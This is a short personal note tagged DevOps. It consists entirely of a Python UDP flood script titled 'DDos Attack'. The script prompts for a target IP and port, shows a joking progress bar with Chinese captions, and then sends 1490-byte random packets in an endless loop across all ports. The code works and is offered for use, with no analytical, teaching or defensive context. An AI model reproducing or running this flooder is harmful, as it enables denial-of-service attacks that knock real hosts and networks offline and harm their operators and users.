---
tags:
  - 技术/DevOps
date: 2026-10-05
---

```python
import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("你完蛋了牢弟")
print("aaronli牛逼666")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% \n要开始了喵")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%\n马上完成喵")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%\n完成喵，开炮！")
time.sleep(1)

sent = 0
while True:
    try:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print(f"Sent {sent} packet to {ip} through port:{port}")
        if port == 65534:
            port = 1
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()
```